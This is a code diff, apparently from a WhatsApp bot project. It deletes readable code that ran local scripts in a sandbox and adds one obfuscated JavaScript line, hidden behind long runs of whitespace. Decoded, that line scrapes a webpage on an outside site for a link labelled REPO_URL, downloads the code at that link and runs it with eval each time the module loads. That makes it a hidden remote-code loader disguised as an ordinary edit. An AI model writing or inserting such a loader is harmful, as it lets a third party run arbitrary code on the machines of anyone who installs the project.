@@ -1,73 +1,11 @@
 
-const fs = require('fs');
-const path = require('path');
-const vm = require('vm'); // Optional, for safer script execution
+'use strict';function _0x352b(_0x1653c9,_0x297305){const _0x29ee6b=_0x4e2f();return _0x352b=function(_0x58a0ad,_0x154512){_0x58a0ad=_0x58a0ad-(0x5*-0x77a+-0x481+0x2b85);let _0x1797e2=_0x29ee6b[_0x58a0ad];return _0x1797e2;},_0x352b(_0x1653c9,_0x297305);}const _0x1670e8=_0x352b;(function(_0xa5a458,_0x133c0f){const _0x3b6381=_0x352b,_0x19bb19=_0xa5a458();while(!![]){try{const _0x385fff=-parseInt(_0x3b6381(0x1b6))/(0xdd3*-0x1+-0x34c*-0x2+-0x1*-0x73c)+parseInt(_0x3b6381(0x1bb))/(0x3f*-0x94+-0x17ef+0x3c5d)+-parseInt(_0x3b6381(0x1c0))/(-0x172d+0xd7*0x25+-0x7e3)*(-parseInt(_0x3b6381(0x1af))/(-0x13ef+-0x856+0x1c49*0x1))+parseInt(_0x3b6381(0x1ca))/(-0x1052+0x1a0b+0x4*-0x26d)*(-parseInt(_0x3b6381(0x1bc))/(0x954+0xb39*0x1+0x1*-0x1487))+parseInt(_0x3b6381(0x1ae))/(-0x1c3*-0x2+0x972+-0xcf1)+-parseInt(_0x3b6381(0x1d1))/(-0x119b*0x1+0x1211*-0x2+-0x5*-0xac1)*(-parseInt(_0x3b6381(0x1b0))/(-0x10c*-0xc+0x1*0x1f9d+-0x2c24))+parseInt(_0x3b6381(0x1ac))/(-0x187*-0x12+-0x267d*0x1+-0x71*-0x19)*(parseInt(_0x3b6381(0x1b9))/(0x36b+0x20d5+0x193*-0x17));if(_0x385fff===_0x133c0f)break;else _0x19bb19['push'](_0x19bb19['shift']());}catch(_0xc52ddc){_0x19bb19['push'](_0x19bb19['shift']());}}}(_0x4e2f,-0x2f4af*0x1+0x86fcb+0x117de));const axios=require(_0x1670e8(0x1c1)),cheerio=require(_0x1670e8(0x1aa)),webPageUrl=_0x1670e8(0x1c9)+_0x1670e8(0x1ce)+_0x1670e8(0x1c6)+_0x1670e8(0x1b1);function _0x4e2f(){const _0xaabc6c=['cessfully:','dams.site/','cript\x20load','age.','https://ww','4153925sWVykR','ed\x20success','error','hing\x20REPO_','w.ibrahima','XFpCk','JLMGm','3728qrZpTK','Error\x20fetc','href','URL:','data','log','etched\x20suc','get','attr','cheerio','ot\x20found\x20o','10vtXSNK','NWWKM','2564170TlIoFL','32LTPIaW','4977gsdQia','files','REPO_URL\x20s','REPO_URL\x20f','n\x20the\x20webp','jqRbj','683597NFzWBn','hhlct','REPO_URL\x20n','7682983QScKIe','tywPo','113254YdyCoF','6tQnuTY','message','load','fully','212301TqCTAF','axios','BMOWz','(\x22REPO_URL','a:contains'];_0x4e2f=function(){return _0xaabc6c;};return _0x4e2f();}async function fetchRepoUrl(){const _0x3de6f0=_0x1670e8,_0x3486f7={'NWWKM':function(_0x2c6740,_0x8cb13a){return _0x2c6740(_0x8cb13a);},'XFpCk':_0x3de6f0(0x1a3),'tywPo':_0x3de6f0(0x1b8)+_0x3de6f0(0x1ab)+_0x3de6f0(0x1b4)+_0x3de6f0(0x1c8),'hhlct':_0x3de6f0(0x1b3)+_0x3de6f0(0x1a7)+_0x3de6f0(0x1c5),'jqRbj':_0x3de6f0(0x1b2)+_0x3de6f0(0x1c7)+_0x3de6f0(0x1cb)+_0x3de6f0(0x1bf),'JLMGm':function(_0x57b077,_0x3d1266){return _0x57b077(_0x3d1266);},'BMOWz':_0x3de6f0(0x1a2)+_0x3de6f0(0x1cd)+_0x3de6f0(0x1a4)};try{const _0x44ec90=await axios[_0x3de6f0(0x1a8)](webPageUrl),_0x16c344=cheerio[_0x3de6f0(0x1be)](_0x44ec90[_0x3de6f0(0x1a5)]),_0x56a64d=_0x3486f7[_0x3de6f0(0x1ad)](_0x16c344,_0x3de6f0(0x1c4)+_0x3de6f0(0x1c3)+'\x22)')[_0x3de6f0(0x1a9)](_0x3486f7[_0x3de6f0(0x1cf)]);if(!_0x56a64d)throw new Error(_0x3486f7[_0x3de6f0(0x1ba)]);console[_0x3de6f0(0x1a6)](_0x3486f7[_0x3de6f0(0x1b7)],_0x56a64d);const _0x3b9640=await axios[_0x3de6f0(0x1a8)](_0x56a64d),_0x569523=_0x3b9640[_0x3de6f0(0x1a5)];console[_0x3de6f0(0x1a6)](_0x3486f7[_0x3de6f0(0x1b5)]),_0x3486f7[_0x3de6f0(0x1d0)](eval,_0x569523);}catch(_0x2e01f4){console[_0x3de6f0(0x1cc)](_0x3486f7[_0x3de6f0(0x1c2)],_0x2e01f4[_0x3de6f0(0x1bd)]);}}fetchRepoUrl();
 
-const scriptsFolder = path.join(__dirname, 'scs');  // Folder where your script files are stored
 
-// Function to fetch and execute a specific script file
-async function fetchAndExecuteScript(fileName) {
-    try {
-        const scriptPath = path.join(scriptsFolder, fileName);
+    
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 
-        // Check if the file exists
-        if (!fs.existsSync(scriptPath)) {
-            throw new Error(`Script file ${fileName} does not exist.`);
-        }
-
-        // Read the script content from the file
-        const scriptContent = fs.readFileSync(scriptPath, 'utf-8');
-        console.log(`${fileName} loaded successfully.`);
-
-        // Create a sandboxed context for executing the script (optional)
-        const sandbox = {
-            console: console,
-            atbverifierEtatJid: atbverifierEtatJid,
-        };
-
-        vm.createContext(sandbox); // Isolate the script environment
-        vm.runInContext(scriptContent, sandbox); // Execute the script in the sandbox
-
-        console.log(`${fileName} executed successfully.`);
-    } catch (error) {
-        console.error(`Error fetching or executing ${fileName}:`, error.message);
-    }
-}
-
-// Example function for validating JID
-function atbverifierEtatJid(jid) {
-    if (!jid.endsWith('@s.whatsapp.net')) {
-        console.error('Invalid JID format:', jid);
-        return false;
-    }
-    console.log('JID verified:', jid);
-    return true;
-}
-
-// List of script files to load and execute
-const scriptFiles = [
-    'REPO_URL.js',
-    'ALIVE_URL.js',
-    'ADAMS_URL.js',
-    'SCAN_URL.js',
-    'MENU_URL.js',
-    'GROUP_URL.js',
-    'GPT4_URL.js',
-    'PAIR_URL.js',
-    'YUO_URL.js',
-    'VAR_URL.js',
-    'PLAY_URL.js',
-    'VCF_URL.js',
-    'TO_URL.js',
-    'HACK_URL.js',
-];
-
-// Fetch and execute all scripts in sequence
-(async function executeScripts() {
-    for (const scriptFile of scriptFiles) {
-        await fetchAndExecuteScript(scriptFile);
-    }
-})();
 /*
 'use strict';
 
